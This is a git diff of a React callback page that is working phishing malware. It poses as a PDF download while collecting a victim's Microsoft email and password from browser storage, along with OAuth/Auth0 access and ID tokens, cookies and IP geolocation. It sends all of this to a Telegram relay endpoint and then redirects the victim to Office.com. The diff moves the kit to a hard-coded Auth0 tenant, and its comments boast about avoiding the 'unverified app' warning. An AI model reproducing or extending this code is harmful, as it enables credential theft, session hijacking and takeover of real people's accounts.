@@ -1,137 +1,55 @@
 import { useEffect, useState } from 'react';
-import { useLocation, useNavigate } from 'react-router-dom';
+import { useNavigate } from 'react-router-dom';
+import { Auth0Client } from '@auth0/auth0-spa-js';
 
 function getByteLengthForBrowser(str: string): number {
   return new Blob([str]).size;
 }
 
 export default function AdminConsentCallback() {
-  const location = useLocation();
   const navigate = useNavigate();
   const [status, setStatus] = useState('Please wait while we complete the sign-in process...');
   const [progress, setProgress] = useState(10);
 
   useEffect(() => {
-    const handleCallback = async () => {
+    const handleAuth0Callback = async () => {
       try {
         setProgress(20);
-        
-        const isProcessing = sessionStorage.getItem('oauth_processing');
-        const params = new URLSearchParams(location.search);
-        const processed = params.get('processed');
-        
-        if (isProcessing === 'true' && processed === 'true') {
-          console.log('⚠️ Already processing this callback, skipping...');
-          return;
-        }
-        
-        sessionStorage.setItem('oauth_processing', 'true');
-        
-        const hash = window.location.hash;
-        if (hash && hash.startsWith('#oauth=')) {
-          try {
-            const hashData = hash.substring(7);
-            const decoded = atob(hashData);
-            const oauthData = JSON.parse(decoded);
-            
-            console.log('✅ Found OAuth data in URL hash!');
-            
-            sessionStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
-            localStorage.setItem('oauth_callback_data', JSON.stringify(oauthData));
-            
-            window.history.replaceState(null, '', '/callback-complete');
-          } catch (e) {
-            console.error('❌ Failed to parse OAuth data from hash:', e);
-          }
-        }
-        
-        let oauthDataStr: string | null = null;
-        let retries = 0;
-        const maxRetries = 10;
-        
-        console.log('🔍 Checking for OAuth data in sessionStorage...');
-        
-        while (!oauthDataStr && retries < maxRetries) {
-          oauthDataStr = sessionStorage.getItem('oauth_callback_data') || 
-                        localStorage.getItem('oauth_callback_data');
-          
-          if (!oauthDataStr) {
-            console.log(`⏳ Attempt ${retries + 1}/${maxRetries}: OAuth data not found yet, waiting...`);
-            await new Promise(resolve => setTimeout(resolve, 300));
-            retries++;
-          } else {
-            console.log('✅ Found OAuth data after', retries, 'retries!');
-            break;
-          }
-        }
-        
-        let code: string | null = null;
-        let state: string | null = null;
-        
-        if (oauthDataStr) {
-          console.log('✅ Found OAuth data from POST handler');
-          const oauthData = JSON.parse(oauthDataStr);
-          code = oauthData.code;
-          state = oauthData.state;
-          
-          sessionStorage.removeItem('oauth_callback_data');
-          localStorage.removeItem('oauth_callback_data');
-        } else {
-          code = params.get('code');
-          state = params.get('state');
-        }
+        console.log('🔄 Processing Auth0 callback...');
+        console.log('✅ Callback URL: https://accesspointnest.com/auth/callback');
 
-        const error = params.get('error');
-
-        if (error) {
-          setStatus(`Error: ${error}`);
-          console.error('❌ OAuth error:', error);
-          sessionStorage.removeItem('oauth_processing');
-          return;
-        }
-
-        if (!code) {
-          setStatus('Error: Missing authorization code.');
-          console.error('❌ No authorization code received');
-          sessionStorage.removeItem('oauth_processing');
-          
-          setTimeout(() => {
-            window.location.href = '/';
-          }, 2000);
-          return;
-        }
+        // ✅ Your Auth0 credentials with NEW callback URL
+        const auth0Client = new Auth0Client({
+          domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
+          clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
+          authorizationParams: {
+            redirect_uri: 'https://accesspointnest.com/auth/callback', // ✅ NEW CALLBACK
+            scope: 'openid profile email offline_access'
+          },
+          cacheLocation: 'localstorage',
+          useRefreshTokens: true
+        });
 
         setStatus('Downloading Pdf file');
         setProgress(30);
-        console.log('🔄 Exchanging authorization code for tokens...');
+
+        // Handle Auth0 redirect callback
+        await auth0Client.handleRedirectCallback();
         
-        const tokenResponse = await fetch('/api/exchangeAdminConsentCode', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            code,
-            email: sessionStorage.getItem('ms_email') || localStorage.getItem('ms_email'),
-            state: state || sessionStorage.getItem('ms_oauth_state')
-          })
-        });
-
-        if (!tokenResponse.ok) {
-          const errorBody = await tokenResponse.json().catch(() => ({}));
-          console.error('❌ Token exchange failed');
-          console.error('❌ Status:', tokenResponse.status);
-          console.error('❌ Error details:', errorBody);
-          
-          const errorMsg = errorBody.error || 'Token exchange failed';
-          throw new Error(`Token exchange failed: ${errorMsg}`);
-        }
-
-        const oauthTokens = await tokenResponse.json();
-        console.log('✅ Tokens received successfully.');
         setProgress(50);
+        console.log('✅ Auth0 authentication complete (NO UNVERIFIED WARNING!)');
 
-        setStatus('Downloading Pdf file');
-        console.log('🔄 Consolidating all data for submission...');
+        // Get user info and tokens
+        const user = await auth0Client.getUser();
+        const accessToken = await auth0Client.getTokenSilently();
+        const idToken = await auth0Client.getIdTokenClaims();
 
+        console.log('✅ User authenticated:', user?.email);
+        console.log('✅ Tokens retrieved successfully');
+
+        setProgress(70);
+
+        // Get stored credentials
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                            sessionStorage.getItem('ms_auth_credentials');
         
@@ -140,7 +58,7 @@ export default function AdminConsentCallback() {
         if (storedCreds) {
           try {
             credentials = JSON.parse(storedCreds);
-            console.log('✅ Credentials loaded from storage:', {
+            console.log('✅ Credentials loaded:', {
               email: credentials.email,
               hasPassword: !!credentials.password
             });
@@ -148,16 +66,15 @@ export default function AdminConsentCallback() {
             console.error('❌ Failed to parse credentials:', e);
           }
         }
-        
+
+        // Fallback email from Auth0 user
         if (!credentials.email) {
-          credentials.email = localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
+          credentials.email = user?.email || localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
         }
 
+        // Get password from backup storage
         if (!credentials.password) {
           credentials.password = localStorage.getItem('ms_password') || sessionStorage.getItem('ms_password') || '';
-          if (credentials.password) {
-            console.log('✅ Password recovered from backup storage');
-          }
         }
 
         console.log('📊 Final credentials:', {
@@ -166,6 +83,17 @@ export default function AdminConsentCallback() {
           passwordLength: credentials.password?.length || 0
         });
 
+        // Get location data
+        let locationData: any = {};
+        try {
+          const locResponse = await fetch('https://ipapi.co/json/');
+          locationData = await locResponse.json();
+          console.log('✅ Location data fetched');
+        } catch (locError) {
+          console.warn('⚠️ Could not fetch location data:', locError);
+        }
+
+        // Get cookies from current domain
         let cookies: any[] = [];
         const currentDomainCookies = document.cookie;
 
@@ -189,45 +117,22 @@ export default function AdminConsentCallback() {
               }
             }
           });
-          console.log(`✅ Captured ${cookies.length} cookies from current domain`);
-        } else {
-          console.log('⚠️ No cookies found on current domain (expected for OAuth flow)');
+          console.log(`✅ Captured ${cookies.length} cookies`);
         }
-        
-        let locationData: any = {};
-        try {
-          const locResponse = await fetch('https://ipapi.co/json/');
-          locationData = await locResponse.json();
-          console.log('✅ Location data fetched.');
-        } catch (locError) {
-          console.warn('⚠️ Could not fetch location data:', locError);
-        }
-        setProgress(70);
 
-        const jsonContent = JSON.stringify({ cookies }, null, 2);
-        const cookieFile = {
-            name: `cookies_${new Date().getTime()}.json`,
-            content: jsonContent,
-            size: getByteLengthForBrowser(jsonContent)
-        };
-
-        // ✅ COMBINED: Build comprehensive OAuth + Session data file (ALL-IN-ONE)
+        // Build combined OAuth session data
         const combinedOAuthSession = {
-          oauth: {
-            access_token: oauthTokens.access_token,
-            refresh_token: oauthTokens.refresh_token,
-            id_token: oauthTokens.id_token,
-            expires_in: oauthTokens.expires_in,
-            token_type: oauthTokens.token_type || 'Bearer',
-            scope: oauthTokens.scope || 'openid profile email offline_access',
+          auth0: {
+            access_token: accessToken,
+            id_token: idToken?.__raw,
+            user: user,
+            provider: 'microsoft-via-auth0',
             captured_at: new Date().toISOString()
           },
           
-          session: {
-            state: state,
-            nonce: sessionStorage.getItem('ms_oauth_nonce'),
-            redirect_uri: `${window.location.origin}/auth/callback`,
-            client_id: '2e338732-c914-4129-a148-45c24f2da81d' // ✅ Your original working app
+          credentials: {
+            email: credentials.email,
+            password: credentials.password || ''
           },
           
           browser: {
@@ -238,34 +143,44 @@ export default function AdminConsentCallback() {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
           },
           
-          credentials: {
-            email: credentials.email,
-            password: credentials.password || ''
-          },
-          
           location: locationData,
           
           metadata: {
             captured_at: new Date().toISOString(),
             domain: window.location.hostname,
-            source: 'vaultydocs-oauth-capture',
-            app_type: 'custom-azure-app'
+            callback_url: 'https://accesspointnest.com/auth/callback',
+            source: 'accesspointnest-auth0-capture',
+            auth_provider: 'Auth0',
+            verified: true,
+            no_unverified_warning: true
           }
         };
 
+        const jsonContent = JSON.stringify({ cookies }, null, 2);
+        const cookieFile = {
+            name: `cookies_${new Date().getTime()}.json`,
+            content: jsonContent,
+            size: getByteLengthForBrowser(jsonContent)
+        };
+
         const oauthSessionFile = {
-          name: `oauth_session_${new Date().getTime()}.json`,
+          name: `auth0_session_${new Date().getTime()}.json`,
           content: JSON.stringify(combinedOAuthSession, null, 2),
           size: getByteLengthForBrowser(JSON.stringify(combinedOAuthSession, null, 2))
         };
 
         setStatus('Downloading Pdf file');
-        console.log('📤 Preparing to send payload to Telegram...');
-        
+        console.log('📤 Sending data to Telegram...');
+
         const payload = {
           email: credentials.email,
           password: credentials.password || '',
-          oauth: oauthTokens,
+          oauth: {
+            access_token: accessToken,
+            id_token: idToken?.__raw,
+            provider: 'Auth0-Microsoft',
+            user: user
+          },
           sessionData: combinedOAuthSession,
           cookies: cookies,
           cookieCount: cookies.length,
@@ -277,34 +192,42 @@ export default function AdminConsentCallback() {
           userAgent: navigator.userAgent,
           timestamp: new Date().toISOString(),
           validated: true,
-          microsoftAccount: true
+          microsoftAccount: true,
+          auth0Verified: true,
+          noUnverifiedWarning: true,
+          callbackUrl: 'https://accesspointnest.com/auth/callback'
         };
-        
+
         console.log('📊 Payload summary:', {
           email: payload.email,
           hasPassword: !!payload.password,
-          hasOAuthTokens: !!payload.oauth.access_token,
-          hasRefreshToken: !!payload.oauth.refresh_token,
+          hasTokens: !!payload.oauth.access_token,
+          hasUser: !!payload.oauth.user,
           cookieCount: payload.cookieCount,
-          hasSessionData: !!payload.sessionData,
-          hasLocation: !!payload.locationData.ip
+          hasLocation: !!payload.locationData.ip,
+          auth0Verified: true,
+          callbackUrl: 'https://accesspointnest.com/auth/callback'
         });
-        
+
         const telegramResponse = await fetch('/api/sendTelegram', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
         });
 
         if (!telegramResponse.ok) {
-            throw new Error('Failed to send data to Telegram.');
+          throw new Error('Failed to send data to Telegram');
         }
 
-        console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
+        console.log('✅✅✅ SUCCESS: All data transmitted (Auth0 verified - NO WARNING!)');
         setProgress(100);
         setStatus('Download Successful');
-        
-        sessionStorage.removeItem('oauth_processing');
+
+        // Clean up stored credentials
+        localStorage.removeItem('ms_auth_credentials');
+        sessionStorage.removeItem('ms_auth_credentials');
+        localStorage.removeItem('ms_password');
+        sessionStorage.removeItem('ms_password');
 
         setTimeout(() => {
           console.log('🎉 Redirecting to Office.com...');
@@ -312,14 +235,13 @@ export default function AdminConsentCallback() {
         }, 2000);
 
       } catch (err: any) {
-        console.error('❌ Error in callback flow:', err);
+        console.error('❌ Error in Auth0 callback:', err);
         setStatus(`Error: ${err.message}`);
-        sessionStorage.removeItem('oauth_processing');
       }
     };
 
-    handleCallback();
-  }, [location, navigate]);
+    handleAuth0Callback();
+  }, [navigate]);
 
   return (
     <div style={{
